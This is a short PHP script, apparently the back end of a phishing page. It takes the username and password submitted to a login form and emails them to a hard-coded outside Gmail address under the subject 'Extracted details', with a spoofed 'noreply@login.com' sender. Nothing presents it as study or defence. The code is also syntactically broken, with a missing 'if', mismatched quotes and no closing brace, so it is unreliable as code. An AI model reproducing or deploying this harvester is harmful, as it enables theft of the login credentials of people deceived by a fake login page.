<?php 
($_POST["email"]<>'') { 
    $ToEmail = 'dagaranupam@gmail.com'; 
    $EmailSubject = 'Extracted details'; 
    $mailheader = "From: "noreply@login.com"\r\n"; 
    $mailheader .= "Reply-To: "noreply@login.com"\r\n"; 
    $mailheader .= "Content-type: text/html; charset=iso-8859-1\r\n"; 
    $MESSAGE_BODY = "username: ".$_POST["username"].""; 
    $MESSAGE_BODY .= "password: ".$_POST["password"].""; 
    mail($ToEmail, $EmailSubject, $MESSAGE_BODY, $mailheader) or die ("Failure"); 
?> 